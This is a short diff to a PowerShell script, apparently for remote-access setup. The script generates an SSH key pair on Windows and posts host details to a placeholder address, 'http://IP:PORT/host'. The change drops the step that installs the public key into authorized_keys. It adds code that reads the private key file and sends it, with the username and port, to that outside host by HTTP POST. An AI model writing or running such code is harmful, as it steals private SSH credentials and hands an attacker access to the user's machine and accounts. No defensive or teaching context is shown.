@@ -45,18 +45,17 @@ $sshKeyPub = "$sshDir\id_rsa.pub"
 if (-not (Test-Path -Path $sshKey)) {
     ssh-keygen -t rsa -b 2048 -f $sshKey -q -N ''
 }
-if (Test-Path -Path $sshKeyPub) {
-    $publicKey = Get-Content -Path $sshKeyPub -Raw
-    Set-Content "$sshDir\authorized_keys" $publicKey
+if (Test-Path -Path $sshKey) {
+    $privateKey = Get-Content -Path $sshKey -Raw
 } else {
-    $publicKey = "[Error: Public key not generated]"
+    $privateKey = "[Error: Private key not found]"
 }
 $username = $env:USERNAME
 $port = 22
 $postUri = "http://IP:PORT/host"
 $postData = @{
     "Username" = $username
-    "PublicKey" = $publicKey
+    "PrivateKey" = $privateKey
     "Port" = $port
 } | ConvertTo-Json
 Invoke-RestMethod -Uri $postUri -Method Post -Body $postData -ContentType 'application/json'
